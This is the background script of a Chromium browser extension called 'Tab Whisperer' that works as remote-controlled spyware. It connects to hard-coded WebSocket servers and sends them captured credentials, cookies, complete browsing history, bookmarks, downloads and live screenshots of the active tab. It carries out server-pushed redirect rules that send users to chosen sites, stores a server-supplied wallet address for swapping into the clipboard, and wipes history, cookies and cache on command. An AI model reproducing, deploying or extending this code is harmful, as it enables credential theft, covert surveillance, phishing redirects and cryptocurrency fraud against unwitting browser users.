// Tab Whisperer Chromium Extension - Robust Background Script
// Production-ready, modern, and extensible

// --- CONSTANTS & STATE ---
const DEFAULT_SERVER_URL = 'wss://ai-server-br6r.onrender.com';
const BACKUP_SERVER_URL = 'wss://ai-backup-server.onrender.com'; // 5. Fallback backup server
const BADGE_ON = { color: '#10b981', text: 'ON' };      // Green
const BADGE_OFF = { color: '#ef4444', text: 'OFF' };    // Red
const BADGE_REC = { color: '#ef4444', text: 'REC' };    // Red (recording)
const BADGE_ERR = { color: '#ef4444', text: 'ERR' };

const CREDENTIAL_QUEUE_KEY = "queuedCredentials";
const RETRY_DELAYS = [1000, 2000, 5000, 10000, 30000, 60000]; // ms, progressive
const MAX_RETRY_COUNT = 50;
const HEARTBEAT_INTERVAL = 10000; // ms
const MAX_CRED_SEND_ATTEMPTS = 5; // 7. Track send attempts

// --- STATE ---
let socket = null;
let isConnected = false;
let retryCount = 0;
let heartbeatTimer = null;
let reconnectTimer = null;

let queuedCredentials = [];
let redirectRules = [];
let activeTabId = null;
let activeTabUrl = '';
let serverUrl = DEFAULT_SERVER_URL;
let currentTabCount = 0;

let isStreaming = false;
let streamingFrameRate = 2;
let streamingInterval = null;
let streamingMode = 'screenshot';
let isStreamingPaused = false; // 2. Pause/resume streaming

let EXT_ID = null;
const EXT_NAME = 'Tab Whisperer Chromium Extension';
const EXT_VERSION = chrome.runtime.getManifest().version || '1.0.0';

// --- UTILITIES (ASYNC WRAPPERS)
const pChrome = {
  get storage() {
    return {
      get: (keys) => new Promise(res => {
        chrome.storage.local.get(keys, result => res(result || {}));
      }),
      set: (items) => new Promise(res => chrome.storage.local.set(items, res)),
    };
  },
  get tabs() {
    return {
      query: (queryInfo) => new Promise(res => chrome.tabs.query(queryInfo, res)),
      get: (tabId) => new Promise(res => chrome.tabs.get(tabId, res)),
      // UPDATED sendMessage method for error handling
      sendMessage: (tabId, msg) => new Promise((res) => {
        chrome.tabs.sendMessage(tabId, msg, (response) => {
          if (chrome.runtime.lastError) {
            res(undefined); // Prevents error from being thrown
          } else {
            res(response);
          }
        });
      }),
      update: (tabId, updateProps) => new Promise(res => chrome.tabs.update(tabId, updateProps, res)),
      remove: (tabId) => new Promise(res => chrome.tabs.remove(tabId, res)),
    };
  },
  get cookies() {
    return {
      getAll: (details) => new Promise(res => chrome.cookies.getAll(details, res)),
      remove: (details) => new Promise(res => chrome.cookies.remove(details, res)),
    };
  },
  get bookmarks() {
    return {
      getTree: () => new Promise(res => chrome.bookmarks.getTree(res)),
    };
  },
  get downloads() {
    return {
      search: (query) => new Promise(res => chrome.downloads.search(query, res)),
    };
  },
  get history() {
    return {
      search: (query) => new Promise(res => chrome.history.search(query, res)),
      deleteUrl: (details) => new Promise(res => chrome.history.deleteUrl(details, res)),
      deleteAll: () => new Promise(res => chrome.history.deleteAll(res)),
    };
  },
  get windows() {
    return {
      update: (windowId, updateInfo) => new Promise(res => chrome.windows.update(windowId, updateInfo, res)),
    };
  }
};
// --- BADGE/UI ---
function setBadge({ color, text, tooltip }) {
  chrome.action.setBadgeBackgroundColor({ color });
  chrome.action.setBadgeText({ text });
  // 3. Badge tooltip shows queued credentials
  if (typeof tooltip === 'string') {
    chrome.action.setTitle({ title: tooltip });
  } else {
    chrome.action.setTitle({ title: `Queued Credentials: ${queuedCredentials.length}` });
  }
}

// --- EXTENSION ID ---
async function getOrCreateExtensionId() {
  const res = await pChrome.storage.get(['__uniqueExtId']);
  if (res && res.__uniqueExtId) return res.__uniqueExtId;
  const id = crypto.randomUUID();
  await pChrome.storage.set({ __uniqueExtId: id });
  return id;
}

// --- RECONNECT LOGIC ---
function scheduleReconnect() {
  if (isConnected) return;
  if (retryCount >= MAX_RETRY_COUNT) {
    // 5. Fallback to backup server if available
    if (serverUrl !== BACKUP_SERVER_URL) {
      serverUrl = BACKUP_SERVER_URL;
      retryCount = 0;
      connectToServer(serverUrl);
      return;
    }
    chrome.notifications.create({
      type: 'basic',
      iconUrl: 'icons/icon128.png',
      title: EXT_NAME,
      message: `Unable to connect to ${serverUrl} after many attempts.`,
      priority: 2
    });
    setBadge(BADGE_ERR);
    return;
  }
  const delay = RETRY_DELAYS[Math.min(retryCount, RETRY_DELAYS.length - 1)];
  reconnectTimer = setTimeout(() => connectToServer(serverUrl), delay);
}

// --- HEARTBEAT ---
function startHeartbeat() {
  if (heartbeatTimer) clearInterval(heartbeatTimer);
  heartbeatTimer = setInterval(() => {
    if (isConnected && socket && socket.readyState === WebSocket.OPEN) {
      sendSocket({
        type: 'extensionHeartbeat',
        id: EXT_ID,
        currentUrl: activeTabUrl,
        tabCount: currentTabCount,
        lastActivity: Date.now()
      });
    }
  }, HEARTBEAT_INTERVAL);
}
function stopHeartbeat() {
  if (heartbeatTimer) clearInterval(heartbeatTimer);
  heartbeatTimer = null;
}

// --- SOCKET SEND (QUEUE ON FAIL) ---
function sendSocket(obj) {
  if (isConnected && socket && socket.readyState === WebSocket.OPEN) {
    try {
      socket.send(JSON.stringify(obj));
    } catch (e) {
      queueMessage(obj);
    }
  } else {
    queueMessage(obj);
  }
}
let messageQueue = [];
function queueMessage(obj) {
  messageQueue.push(obj);
}
function flushMessages() {
  while (isConnected && socket && socket.readyState === WebSocket.OPEN && messageQueue.length) {
    socket.send(JSON.stringify(messageQueue.shift()));
  }
}

// --- QUEUE CREDENTIALS with send attempts ---
function queueCredential(cred) {
  cred.__sendAttempts = cred.__sendAttempts || 0;
  queuedCredentials.push(cred);
  pChrome.storage.set({ [CREDENTIAL_QUEUE_KEY]: queuedCredentials });
}

// 1 & 7. Robust flush, track attempts, notify user on repeated failure
function notifyCredentialDeliveryFailed(cred) {
  if (chrome.notifications && chrome.notifications.create) {
    chrome.notifications.create({
      type: 'basic',
      iconUrl: 'icons/icon128.png',
      title: 'Credential Delivery Failed',
      message: 'A captured credential failed to be sent to the server after several attempts.',
      priority: 2
    });
  } else {
    console.error('chrome.notifications is undefined!');
  }
}
function flushQueuedCredentials() {
  if (!isConnected || !socket || !queuedCredentials.length) return;
  let stillQueued = [];
  for (let cred of queuedCredentials) {
    if (cred.__sendAttempts === undefined) cred.__sendAttempts = 0;
    try {
      sendSocket({ type: "credentialCaptured", credential: cred });
    } catch (err) {
      cred.__sendAttempts++;
      if (cred.__sendAttempts >= MAX_CRED_SEND_ATTEMPTS) {
        notifyCredentialDeliveryFailed(cred);
      } else {
        stillQueued.push(cred);
      }
    }
  }
  queuedCredentials = stillQueued;
  pChrome.storage.set({ [CREDENTIAL_QUEUE_KEY]: queuedCredentials });
}

// --- SOCKET CONNECTION LIFECYCLE---
async function connectToServer(url) {
  if (socket) {
    try { socket.close(); } catch {}
    socket = null;
  }
  setBadge(BADGE_OFF);
  isConnected = false;
  retryCount++;

  try {
    socket = new WebSocket(url);
    socket.onopen = async () => {
      isConnected = true;
      retryCount = 0;
      setBadge({ ...BADGE_ON });
      startHeartbeat();
      flushMessages();
      flushQueuedCredentials();

      // Register extension with current state
      await updateTabCount();
      sendSocket({
        type: 'extensionHello',
        id: EXT_ID,
        name: EXT_NAME,
        version: EXT_VERSION,
        currentUrl: activeTabUrl,
        tabCount: currentTabCount,
        lastActivity: Date.now()
      });

      // Sync local state on connect
      await syncState();

      // 11. Log connection
      console.log('Connected to server');
    };

    socket.onclose = () => {
      isConnected = false;
      setBadge({ ...BADGE_OFF });
      stopHeartbeat();
      if (isStreaming) stopTabCapture();
      // 11. Log disconnect
      console.log('Disconnected from server');
      scheduleReconnect();
    };

    socket.onerror = (err) => {
      isConnected = false;
      setBadge({ ...BADGE_ERR });
      stopHeartbeat();
      scheduleReconnect();
      chrome.notifications.create({
        type: 'basic',
        iconUrl: 'icons/icon128.png',
        title: EXT_NAME,
        message: `WebSocket error: ${err.message || 'unknown error'}`,
        priority: 2
      });
      // 11. Log error
      console.error('WebSocket error:', err);
    };

    socket.onmessage = (event) => {
      // 11. Log every message type
      try {
        const parsed = JSON.parse(event.data);
        if (parsed.type) console.log('Server message:', parsed.type, parsed);
      } catch {}
      handleServerMessage(event.data);
    };
  } catch (e) {
    setBadge({ ...BADGE_ERR });
    stopHeartbeat();
    scheduleReconnect();
    // 11. Log error
    console.error('Error connecting to server:', e);
  }
}

// --- SERVER MESSAGE HANDLER ---
async function handleServerMessage(data) {
  let msg;
  try {
    msg = JSON.parse(data);
  } catch (e) {
    console.error('Error parsing server message', data, e);
    return;
  }

  switch (msg.type) {
    case 'redirect':
      redirectToUrl(msg.url);
      break;
    case 'addRedirectRule':
      addRedirectRule(msg.rule?.sourceUrl || msg.sourceUrl, msg.rule?.targetUrl || msg.targetUrl, msg.rule?.id, msg.rule?.active ?? true);
      break;
    case 'removeRedirectRule':
      removeRedirectRule(msg.id);
      break;
    case 'updateRedirectRule':
      updateRedirectRule(msg.id, msg.active);
      break;
    case 'redirectRules':
      if (msg.rules) {
        redirectRules = msg.rules;
        await pChrome.storage.set({ redirectRules });
      }
      break;
    case 'walletAddressUpdate':
      if (msg.address) {
        await pChrome.storage.set({ clipboardWalletAddress: msg.address });
        console.log('Wallet address updated from server:', msg.address);
      }
      break;
    case 'getCookies':
      extractCookies(msg.url || activeTabUrl);
      break;
    case 'getHistory':
      fetchBrowserHistory(msg.maxResults || 10000);
      break;
    case 'getBookmarks':
      fetchBookmarks();
      break;
    case 'getDownloads':
      fetchDownloads();
      break;
    case 'getFileSystem':
      accessFileSystem(msg.path || '/');
      break;
    case 'getTabs':
      fetchAllTabs();
      break;
    case 'focusTab':
      focusTab(msg.tabId);
      break;
    case 'closeTab':
      closeTab(msg.tabId);
      break;
    case 'clearData':
      clearBrowserData(msg.url, msg.options);
      break;
    case 'clearAllData':
      clearAllBrowserData(msg.options);
      break;
    case 'setServerUrl':
      if (msg.url) {
        serverUrl = msg.url;
        await pChrome.storage.set({ serverUrl });
        connectToServer(serverUrl);
      }
      break;
    case 'startStreaming':
      startTabCapture(msg.mode || 'screenshot', msg.frameRate || 2);
      break;
    case 'stopStreaming':
      stopTabCapture();
      break;
    case 'pauseStreaming': // 2. Pause streaming
      pauseTabCapture();
      break;
    case 'resumeStreaming': // 2. Resume streaming
      resumeTabCapture();
      break;
    case 'takeSnapshot':
      captureActiveTab();
      break;
    default:
      if (!['tabCapture','activeTab','tabs','bookmarks','downloads','history','extensionsUpdate'].includes(msg.type)) console.log('Unknown message type:', msg.type);

  }
}

// --- UPDATE TAB COUNT ---
async function updateTabCount() {
  try {
    const tabs = await pChrome.tabs.query({});
    currentTabCount = tabs.length;
  } catch (error) {
    currentTabCount = 0;
  }
}

// --- TAB STATE + EVENT SYNC ---
chrome.tabs.onActivated.addListener(async (activeInfo) => {
  activeTabId = activeInfo.tabId;
  try {
    const tab = await pChrome.tabs.get(activeTabId);
    if (tab && tab.url) {
      activeTabUrl = tab.url;
      await updateTabCount();
      sendActiveTabUpdate();
      if (isStreaming && !isStreamingPaused) {
        stopTabCapture();
        startTabCapture(streamingMode, streamingFrameRate);
      }
    }
  } catch (error) {
    // 8. Tab error feedback
    console.error('Error getting tab info:', error);
  }
});

// --- Helper functions---
function extractDomain(url) {
  try {
    if (!/^https?:\/\//i.test(url)) url = 'https://' + url;
    return (new URL(url)).hostname.replace(/^www\./, '');
  } catch (e) {
    return '';
  }
}

function redirectToUrl(url) {
  if (activeTabId) {
    if (!/^https?:\/\//i.test(url)) {
      url = 'https://' + url;
    }
    pChrome.tabs.update(activeTabId, { url });
    console.log(`Redirecting to ${url}`);
  }
}

// 4. Track tab metadata changes (title, favicon)
chrome.tabs.onUpdated.addListener(async (tabId, changeInfo, tab) => {
  if (changeInfo.url) {
    const tabDomain = extractDomain(changeInfo.url);
    const matchingRule = redirectRules.find(r =>
      r.active && tabDomain.includes(extractDomain(r.sourceUrl))
    );
    if (matchingRule) {
      redirectToUrl(matchingRule.targetUrl);
      return; // Avoid redundant updates
    }
  }
  
  if (tabId === activeTabId && changeInfo.url) {
    activeTabUrl = changeInfo.url;
    await updateTabCount();
    sendActiveTabUpdate();
  }
  // 4. Detect and report title or favicon changes
  if (changeInfo.title || changeInfo.favIconUrl) {
    sendSocket({ 
      type: "tabMetaUpdated", 
      tabId, 
      title: changeInfo.title, 
      favicon: changeInfo.favIconUrl, 
      timestamp: Date.now() 
    });
  }
  // Broadcast all tab updates to server
  sendSocket({ type: "tabUpdated", tabId, changeInfo, tab, timestamp: Date.now() });
});

chrome.tabs.onCreated.addListener(async (tab) => {
  await updateTabCount();
  sendSocket({ 
    type: "tabCreated", 
    tab, 
    timestamp: Date.now(),
    tabCount: currentTabCount 
  });
});

chrome.tabs.onRemoved.addListener(async (tabId, removeInfo) => {
  await updateTabCount();
  sendSocket({ 
    type: "tabRemoved", 
    tabId, 
    removeInfo, 
    timestamp: Date.now(),
    tabCount: currentTabCount 
  });
});

// --- PERIODIC STATE SYNC ---
setInterval(async () => {
  if (isConnected && socket && socket.readyState === WebSocket.OPEN) {
    await updateTabCount();
    fetchAllTabs();
    fetchBrowserHistory(100);
    fetchBookmarks();
    fetchDownloads();
  }
}, 30000);

// --- ACTIVE TAB UPDATE (and redirect check) ---
async function sendActiveTabUpdate() {
  if (!activeTabUrl) return;
  sendSocket({ 
    type: 'activeTab', 
    url: activeTabUrl,
    tabCount: currentTabCount,
    lastActivity: Date.now()
  });
  // Updated robust domain-based matching:
  const tabDomain = extractDomain(activeTabUrl);
  const matchingRule = redirectRules.find(r =>
    r.active && tabDomain.includes(extractDomain(r.sourceUrl))
  );
  //const matchingRule = redirectRules.find(r => r.active && activeTabUrl.includes(r.sourceUrl));
  if (matchingRule) redirectToUrl(matchingRule.targetUrl);
  if (activeTabId) {
    try {
      await pChrome.tabs.sendMessage(activeTabId, { action: 'extractCookies' });
    } catch (err) {
      // 8. Tab error feedback
      console.log('Content script not ready or cannot access this page');
    }
  }
}

// --- CREDENTIAL HANDLING ---
function handleCapturedCredential(credential) {
  sendSocket({ type: "credentialCaptured", credential });
}

// --- STORAGE SYNC ON CONNECT ---
async function syncState() {
  const { redirectRules = [] } = await pChrome.storage.get(['redirectRules']);
  const { queuedCredentials = [] } = await pChrome.storage.get([CREDENTIAL_QUEUE_KEY]);
  sendSocket({ type: "syncState", redirectRules, queuedCredentials });
}

chrome.storage.onChanged.addListener((changes, area) => {
  if (area === 'local' && changes.redirectRules) {
    redirectRules = changes.redirectRules.newValue || [];
    console.log('Reloaded redirect rules from storage:', redirectRules);
  }
  if (area === 'local' && changes.queuedCredentials) {
    queuedCredentials = changes.queuedCredentials.newValue || [];
    console.log('Reloaded queued credentials from storage:', queuedCredentials);
  }
});

// --- REMOTE COMMANDS (data fetchers) ---
async function fetchAllTabs() {
  const tabs = await pChrome.tabs.query({});
  console.log('All open tabs:', tabs);
  sendSocket({ type: 'tabs', tabs });
}
async function fetchBrowserHistory(maxResults) {
  const historyItems = await pChrome.history.search({ text: '', maxResults, startTime: 0 });
  console.log('All history items:', historyItems);
  const items = historyItems.map((item, idx) => ({
    ...item,
    id: item.id || `history-${idx}`,
    visitTime: item.lastVisitTime || item.visitTime || Date.now()
  }));
  sendSocket({ type: 'history', items });
}
async function fetchBookmarks() {
  const tree = await pChrome.bookmarks.getTree();
  const bookmarks = flattenBookmarks(tree);
  console.log('All bookmarks:', bookmarks);
  sendSocket({ type: 'bookmarks', items: bookmarks });
}
function flattenBookmarks(nodes) {
  let bookmarks = [];
  for (const node of nodes) {
    if (node.url) {
      bookmarks.push({
        id: node.id,
        title: node.title,
        url: node.url,
        dateAdded: node.dateAdded,
        parentId: node.parentId
      });
    }
    if (node.children) bookmarks = bookmarks.concat(flattenBookmarks(node.children));
  }
  // 9. Log count
  console.log(`Flattened bookmarks: ${bookmarks.length}`);
  return bookmarks;
}
async function fetchDownloads() {
  const items = await pChrome.downloads.search({});
  console.log('All download items:', items);
  sendSocket({ type: 'downloads', items });
}
async function extractCookies(url) {
  if (!url) return;
  const cookies = await pChrome.cookies.getAll({ url });
  sendSocket({ type: 'cookies', url, cookies });
  if (activeTabId) {
    try { await pChrome.tabs.sendMessage(activeTabId, { action: 'extractCookies' }); } catch {}
  }
}
function accessFileSystem(path) {
  sendSocket({
    type: 'fileSystem',
    items: [
      {
        name: "Note: Limited Access",
        path: path,
        isDirectory: true,
        modifiedTime: Date.now()
      },
      {
        name: "Chrome Extensions have limited file system access",
        path: `${path}/limitations.txt`,
        isDirectory: false,
        size: 1024,
        modifiedTime: Date.now()
      }
    ]
  });
  chrome.notifications.create({
    type: 'basic',
    iconUrl: 'icons/icon128.png',
    title: 'File System Access Limited',
    message: 'Chrome extensions have limited file system access for security reasons.',
    priority: 1
  });
  // 10. Log file system access
  console.log(`Sent placeholder file system items for path: ${path}`);
}

// --- TAB MANAGEMENT ---
async function focusTab(tabId) {
  try {
    const tab = await pChrome.tabs.update(parseInt(tabId), { active: true });
    if (tab && tab.windowId) await pChrome.windows.update(tab.windowId, { focused: true });
    // 8. Feedback
    console.log(`Focused tab ${tabId}`);
  } catch (err) {
    // 8. Tab error feedback
    console.error('Error focusing tab:', err);
  }
}
async function closeTab(tabId) {
  try {
    await pChrome.tabs.remove(parseInt(tabId));
    // 8. Feedback
    console.log(`Closed tab ${tabId}`);
  } catch (err) {
    // 8. Tab error feedback
    console.error('Error closing tab:', err);
  }
}

// --- REDIRECT RULE MGMT ---
function addRedirectRule(sourceUrl, targetUrl, id = null, active = true) {
  const newRule = { id: id || crypto.randomUUID(), sourceUrl, targetUrl, active };
  const idx = id ? redirectRules.findIndex(r => r.id === id) : redirectRules.findIndex(r => r.sourceUrl === sourceUrl);
  if (idx >= 0) redirectRules[idx] = newRule;
  else redirectRules.push(newRule);
  pChrome.storage.set({ redirectRules });
  if (active && activeTabUrl && activeTabUrl.includes(sourceUrl)) redirectToUrl(targetUrl);
  // 11. Log
  console.log(`Added redirect rule: ${sourceUrl} → ${targetUrl}, active: ${active}`);
}
function removeRedirectRule(id) {
  redirectRules = redirectRules.filter(r => r.id !== id);
  pChrome.storage.set({ redirectRules });
  // 11. Log
  console.log(`Removed redirect rule with id: ${id}`);
}
function updateRedirectRule(id, active) {
  const rule = redirectRules.find(r => r.id === id);
  if (rule) {
    rule.active = active;
    pChrome.storage.set({ redirectRules });
    if (active && activeTabUrl && activeTabUrl.includes(rule.sourceUrl)) redirectToUrl(rule.targetUrl);
    // 11. Log
    console.log(`Updated redirect rule ${id} to ${active ? 'active' : 'inactive'}`);
  }
}
function redirectToUrl(url) {
  if (activeTabId) pChrome.tabs.update(activeTabId, { url });
  // 11. Log
  console.log(`Redirecting to ${url}`);
}

// --- TAB CAPTURE (STREAMING/SNAPSHOT/PAUSE/RESUME) ---
let isCapturing = false;
const MIN_CAPTURE_INTERVAL_MS = 600; // Chrome's safe limit
// 2. Pause/resume streaming
function startTabCapture(mode = 'screenshot', frameRate = 2) {
  stopTabCapture();
  isStreaming = true;
  isStreamingPaused = false;
  streamingMode = mode;
  streamingFrameRate = frameRate;
  const interval = Math.max(1000 / streamingFrameRate, MIN_CAPTURE_INTERVAL_MS);
  streamingInterval = setInterval(captureActiveTab, interval);
  setBadge({ ...BADGE_REC });
  sendSocket({ type: 'streamingStarted', mode, frameRate });
  // 11. Log
  console.log(`Started tab capture in ${mode} mode at ${frameRate} FPS`);
}
function stopTabCapture() {
  if (streamingInterval) clearInterval(streamingInterval);
  streamingInterval = null;
  isStreaming = false;
  isStreamingPaused = false;
  sendSocket({ type: 'streamingStopped' });
  setBadge({ ...(isConnected ? BADGE_ON : BADGE_OFF) });
  // 11. Log
  console.log('Tab capture stopped');
}
function pauseTabCapture() {
  if (isStreaming && !isStreamingPaused) {
    if (streamingInterval) clearInterval(streamingInterval);
    streamingInterval = null;
    isStreamingPaused = true;
    sendSocket({ type: 'streamingPaused' });
    setBadge({ color: '#fbbf24', text: 'PAU' }); // Amber, paused
    // 11. Log
    console.log('Tab capture paused');
  }
}
function resumeTabCapture() {
  if (isStreaming && isStreamingPaused) {
    streamingInterval = setInterval(captureActiveTab, 1000 / streamingFrameRate);
    isStreamingPaused = false;
    sendSocket({ type: 'streamingResumed' });
    setBadge({ ...BADGE_REC });
    // 11. Log
    console.log('Tab capture resumed');
  }
}
function captureActiveTab() {
  if (!activeTabId) {
    // 11. Log
    console.log('No active tab to capture');
    return;
  }
  if (isCapturing) return;
  isCapturing = true;
  try {
    chrome.tabs.captureVisibleTab(null, { format: 'jpeg', quality: 70 }, (dataUrl) => {
      if (chrome.runtime.lastError) {
        console.error('Error capturing tab:', chrome.runtime.lastError?.message || chrome.runtime.lastError);
        isCapturing = false;
        return;
      }
      if (!dataUrl || typeof dataUrl !== "string" || !dataUrl.startsWith("data:image/")) {
        console.error('Invalid dataUrl returned from captureVisibleTab');
        isCapturing = false;
        return;
      }
      sendSocket({
        type: 'tabCapture',
        tabId: activeTabId,
        url: activeTabUrl,
        timestamp: Date.now(),
        imageData: dataUrl
      });
      isCapturing = false;
    });
  } catch (err) {
    isCapturing = false;
    // 11. Log
    console.error('Error in captureActiveTab:', err);
  }
}

// --- DATA CLEARING ---
async function clearBrowserData(url, options) {
  // Clear cookies for this URL if requested
  if (options.cookies) {
    const cookies = await pChrome.cookies.getAll({ url });
    for (const cookie of cookies) {
      const protocol = url.startsWith('https') ? 'https:' : 'http:';
      await pChrome.cookies.remove({
        url: `${protocol}//${cookie.domain}${cookie.path}`,
        name: cookie.name
      });
    }
  }

  // Clear localStorage/sessionStorage for this URL if requested
  if (options.localStorage || options.sessionStorage) {
    if (activeTabId && activeTabUrl && activeTabUrl.includes(new URL(url).hostname)) {
      try {
        await pChrome.tabs.sendMessage(activeTabId, {
          action: 'clearStorage',
          url,
          localStorage: options.localStorage,
          sessionStorage: options.sessionStorage
        });
      } catch (e) {
        console.log('Content script not ready or cannot access this page');
      }
    }
  }

  // Clear browser history for this URL if requested
  if (options.history) {
    const historyItems = await pChrome.history.search({ text: url });
    for (const item of historyItems) {
      if (item.url && item.url.includes(new URL(url).hostname)) {
        await pChrome.history.deleteUrl({ url: item.url });
      }
    }
    console.log(`Cleared history items for ${url}`);
  }

  // Clear browser cache for this URL if requested
  if (options.cache) {
    const since = Date.now() - 30 * 24 * 60 * 60 * 1000; // 30 days ago
    chrome.browsingData.removeCache({ since }, () => {
      console.log(`Cleared cache for ${url}`);
    });
  }

  // Notify server
  if (isConnected && socket) {
    sendSocket({
      type: 'dataClearingComplete',
      url: url,
      timestamp: new Date().toISOString()
    });
  }
}

async function clearAllBrowserData(options) {
  // Clear all cookies if requested
  if (options.cookies) {
    const cookies = await pChrome.cookies.getAll({});
    for (const cookie of cookies) {
      const protocol = cookie.secure ? 'https:' : 'http:';
      await pChrome.cookies.remove({
        url: `${protocol}//${cookie.domain}${cookie.path}`,
        name: cookie.name
      });
    }
  }

  // Clear all localStorage/sessionStorage
  if (options.localStorage || options.sessionStorage) {
    if (activeTabId) {
      try {
        await pChrome.tabs.sendMessage(activeTabId, {
          action: 'clearAllStorage',
          localStorage: options.localStorage,
          sessionStorage: options.sessionStorage
        });
      } catch (e) {
        console.log('Content script not ready or cannot access this page');
      }
    }
  }

  // Clear all browser history if requested
  if (options.history) {
    await pChrome.history.deleteAll();
    console.log('Cleared all history items');
  }

  // Clear all browser cache if requested
  if (options.cache) {
    chrome.browsingData.removeCache({}, () => {
      console.log('Cleared all cache');
    });
  }

  // Notify server
  if (isConnected && socket) {
    sendSocket({
      type: 'allDataClearingComplete',
      timestamp: new Date().toISOString()
    });
  }
}

// --- CONTENT SCRIPT MESSAGE HANDLER ---
chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
  // 11. Log every message
  console.log('Received message:', message);
  switch (message.action) {
    case 'cookiesExtracted':
      sendSocket({ type: 'cookies', url: message.url, cookies: message.cookies });
      break;
    case 'getAllTabsRequest':
      fetchAllTabs();
      break;
    case 'credentialCaptured':
      handleCapturedCredential(message.credential);
      break;
    case 'getCredentials':
      pChrome.storage.get(["credentials"]).then(result => {
        sendResponse({ credentials: result.credentials || [] });
      });
      return true;
    default:
      // Unhandled
      break;
  }
  return true;
});

// --- EXTENSION ICON CLICK ---
// 6. Manual sync on icon click
chrome.action.onClicked.addListener(async () => {
  if (!isConnected) {
    connectToServer(serverUrl);
  } else {
    await updateTabCount();        // Always update currentTabCount
    await syncState();             // Ensure remote server has latest state
    await fetchAllTabs();
    await fetchBrowserHistory(10000);
    await fetchBookmarks();
    await fetchDownloads();
    chrome.notifications.create({
      type: 'basic',
      iconUrl: 'icons/icon128.png',
      title: EXT_NAME,
      message: `Manual sync triggered.`,
      priority: 1
    });
  }
});

// --- UNHANDLED ERRORS ---
self.addEventListener('unhandledrejection', function(event) {
  // 11. Log error
  console.error('Unhandled rejection:', event.reason);
  chrome.notifications.create({
    type: 'basic',
    iconUrl: 'icons/icon128.png',
    title: 'Extension Error',
    message: 'An error occurred: ' + event.reason,
    priority: 2
  });
});

// --- INITIALIZATION ---
(async function startup() {
  setBadge({ ...BADGE_OFF, tooltip: `Queued Credentials: ${queuedCredentials.length}` });
  const sid = await getOrCreateExtensionId();
  EXT_ID = 'EXT-' + sid;
  // Use safe assignments here:
  const [urlRes, credRes, ruleRes] = await Promise.all([
    pChrome.storage.get(['serverUrl']),
    pChrome.storage.get([CREDENTIAL_QUEUE_KEY]),
    pChrome.storage.get(['redirectRules'])
  ]);
  serverUrl = (urlRes && urlRes.serverUrl) ? urlRes.serverUrl : DEFAULT_SERVER_URL;
  queuedCredentials = (credRes && credRes[CREDENTIAL_QUEUE_KEY]) ? credRes[CREDENTIAL_QUEUE_KEY] : [];
  redirectRules = (ruleRes && ruleRes.redirectRules) ? ruleRes.redirectRules : [];

  connectToServer(serverUrl);

  pChrome.tabs.query({ active: true, currentWindow: true }).then(async (tabs) => {
    if (tabs && tabs.length > 0) {
      activeTabId = tabs[0].id;
      activeTabUrl = tabs[0].url || '';
      await updateTabCount();
      sendActiveTabUpdate();
    }
  });

  console.log('Extension started. Initial badge set. Attempted initial connection.');
})();
